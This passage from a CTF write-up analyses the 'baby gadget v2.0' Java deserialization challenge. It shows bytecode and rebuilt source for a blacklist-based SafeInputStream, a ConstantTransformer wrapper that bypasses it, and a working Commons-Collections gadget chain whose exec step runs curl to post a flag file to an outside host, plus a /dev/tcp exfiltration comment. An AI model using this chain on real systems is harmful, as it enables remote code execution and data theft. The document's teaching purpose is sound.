+</span></span><span class="line"><span class="cl">    LINENUMBER 27 L2
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    ICONST_0
+</span></span><span class="line"><span class="cl">    PUTFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+</span></span><span class="line"><span class="cl">   L3
+</span></span><span class="line"><span class="cl">    LINENUMBER 28 L3
+</span></span><span class="line"><span class="cl">    GETSTATIC com/tr1ple/sus/controller/SafeInputStream.blacklist : [Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    INVOKESTATIC java/util/Arrays.asList ([Ljava/lang/Object;)Ljava/util/List;
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    INVOKEINTERFACE java/util/List.contains (Ljava/lang/Object;)Z (itf)
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L5
+</span></span><span class="line"><span class="cl">    LINENUMBER 29 L5
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Set&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L6
+</span></span><span class="line"><span class="cl">    LINENUMBER 30 L6
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;List&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L7
+</span></span><span class="line"><span class="cl">    LINENUMBER 31 L7
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Map&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L8
+</span></span><span class="line"><span class="cl">    LINENUMBER 32 L8
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Tree&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L9
+</span></span><span class="line"><span class="cl">    LINENUMBER 33 L9
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Font&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L10
+</span></span><span class="line"><span class="cl">    LINENUMBER 34 L10
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Support&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L11
+</span></span><span class="line"><span class="cl">    LINENUMBER 35 L11
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Collection&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L12
+</span></span><span class="line"><span class="cl">    LINENUMBER 36 L12
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Impl&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFNE L4
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">   L13
+</span></span><span class="line"><span class="cl">    LINENUMBER 37 L13
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    LDC &#34;Bag&#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+</span></span><span class="line"><span class="cl">    IFEQ L14
+</span></span><span class="line"><span class="cl">   L4
+</span></span><span class="line"><span class="cl">    LINENUMBER 39 L4
+</span></span><span class="line"><span class="cl">   FRAME SAME
+</span></span><span class="line"><span class="cl">    NEW java/lang/ClassNotFoundException
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    NEW java/lang/StringBuilder
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/lang/StringBuilder.&lt;init&gt; ()V
+</span></span><span class="line"><span class="cl">    LDC &#34;Cannot deserialize &#34;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/lang/ClassNotFoundException.&lt;init&gt; (Ljava/lang/String;)V
+</span></span><span class="line"><span class="cl">    ATHROW
+</span></span><span class="line"><span class="cl">   L14
+</span></span><span class="line"><span class="cl">    LINENUMBER 41 L14
+</span></span><span class="line"><span class="cl">   FRAME SAME
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/io/ObjectInputStream.resolveClass (Ljava/io/ObjectStreamClass;)Ljava/lang/Class;
+</span></span><span class="line"><span class="cl">    ARETURN
+</span></span><span class="line"><span class="cl">   L1
+</span></span><span class="line"><span class="cl">    LINENUMBER 44 L1
+</span></span><span class="line"><span class="cl">   FRAME SAME
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/io/ObjectInputStream.resolveClass (Ljava/io/ObjectStreamClass;)Ljava/lang/Class;
+</span></span><span class="line"><span class="cl">    ARETURN
+</span></span><span class="line"><span class="cl">   L15
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE this Lcom/tr1ple/sus/controller/SafeInputStream; L0 L15 0
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE des Ljava/io/ObjectStreamClass; L0 L15 1
+</span></span><span class="line"><span class="cl">    MAXSTACK = 4
+</span></span><span class="line"><span class="cl">    MAXLOCALS = 2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // access flags 0x8
+</span></span><span class="line"><span class="cl">  static &lt;clinit&gt;()V
+</span></span><span class="line"><span class="cl">   L0
+</span></span><span class="line"><span class="cl">    LINENUMBER 12 L0
+</span></span><span class="line"><span class="cl">    ICONST_5
+</span></span><span class="line"><span class="cl">    ANEWARRAY java/lang/String
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ICONST_0
+</span></span><span class="line"><span class="cl">    LDC &#34;java.util.Hashtable&#34;
+</span></span><span class="line"><span class="cl">    AASTORE
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ICONST_1
+</span></span><span class="line"><span class="cl">    LDC &#34;java.util.HashSet&#34;
+</span></span><span class="line"><span class="cl">    AASTORE
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ICONST_2
+</span></span><span class="line"><span class="cl">    LDC &#34;java.util.HashMap&#34;
+</span></span><span class="line"><span class="cl">    AASTORE
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ICONST_3
+</span></span><span class="line"><span class="cl">    LDC &#34;javax.management.BadAttributeValueExpException&#34;
+</span></span><span class="line"><span class="cl">    AASTORE
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ICONST_4
+</span></span><span class="line"><span class="cl">    LDC &#34;java.util.PriorityQueue&#34;
+</span></span><span class="line"><span class="cl">    AASTORE
+</span></span><span class="line"><span class="cl">    PUTSTATIC com/tr1ple/sus/controller/SafeInputStream.blacklist : [Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    RETURN
+</span></span><span class="line"><span class="cl">    MAXSTACK = 4
+</span></span><span class="line"><span class="cl">    MAXLOCALS = 0
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果对JVM指令有所了解，这个汇编本身并不难读，有两点：</p>
+<ul>
+<li>一个springboot的路由 <code>/bf2dcf6664b16e0efe471b2eac2b54b2</code> ，这个接口会获取body的数据，先URL解码，再base64解码，最后直接反序列化，但是这里用到了自定义的ObjectInputStream <code>SafeInputStream</code></li>
+<li><code>SafeInputStream</code> 继承了 <code>ObjectInputStream</code> ，内置了反序列化黑名单，并在 <code>resolveClass</code> 中检测</li>
+</ul>
+<p>和队友@Longlone根据虚拟机指令手动还原出了本身的java文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeInputStream</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="n">entry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">blackList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.Hashtable&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.HashSet&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.HashMap&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;javax.management.BadAttributeValueExpException&#34;</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;java.util.PriorityQueue&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">SafeInputStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">entry</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">entry</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">entry</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">blackList</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">())</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Set&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;List&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Map&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Tree&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Font&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Support&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Collection&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Impl&#34;</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Bag&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">ClassNotFoundException</span><span class="o">(</span><span class="s">&#34;Cannot deserializ &#34;</span> <span class="o">+</span> <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里绕过resolve，只需要把实际的反序列化对象套在一个不在黑名单且可以反序列化的类中，第一轮扫描之后entry就为false，绕过黑名单检测，之后就会正常递归反序列化其属性。比较合适是 <code>ConstantTransformer</code> ，因为它有一个属性是 <code>Object</code> 类型的，可以设置为任何值。</p>
+<p>依赖是CC3.1，JDK版本是8u191，选择一条合适的Gadget构造序列化数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]}),</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 先命令外带列目录 ls / | base64 &gt; /dev/tcp/127.0.0.1/23333
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;curl&#34;</span><span class="o">,</span> <span class="s">&#34;-d&#34;</span><span class="o">,</span> <span class="s">&#34;@/th1s_is_f1ag.txt&#34;</span><span class="o">,</span><span class="s">&#34;http://IP:PORT/Foo/&#34;</span><span class="o">}}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">1</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">outerMap</span><span class="o">,</span> <span class="s">&#34;111&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;222&#34;</span><span class="o">,</span> <span class="n">tiedMapEntry</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.commons.collections.bidimap.DualHashBidiMap&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">BidiMap</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">dualHashBidiMap</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">expMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">        <span class="c1">// 套一层ConstantTransformer用于bypass resolveClass()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ConstantTransformer</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">dualHashBidiMap</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()).</span><span class="na">replace</span><span class="o">(</span><span class="s">&#34;\n&#34;</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">encode</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">StringSelection</span> <span class="n">selection</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringSelection</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Clipboard</span> <span class="n">clipboard</span> <span class="o">=</span> <span class="n">Toolkit</span><span class="o">.</span><span class="na">getDefaultToolkit</span><span class="o">().</span><span class="na">getSystemClipboard</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clipboard</span><span class="o">.</span><span class="na">setContents</span><span class="o">(</span><span class="n">selection</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不能直接弹shell，采用命令外带+文件读取的方式拿flag。</p>
+<h2 id="baby-gadget-v20-revenge">baby gadget v2.0 revenge</h2>
+<p>XXE的方式同上，拿到源码的ASM汇编之后和上一题的进行diff：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227213311806.png" alt="image-20220227213311806"></p>
+<p>同样不难写出其java源代码的形式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
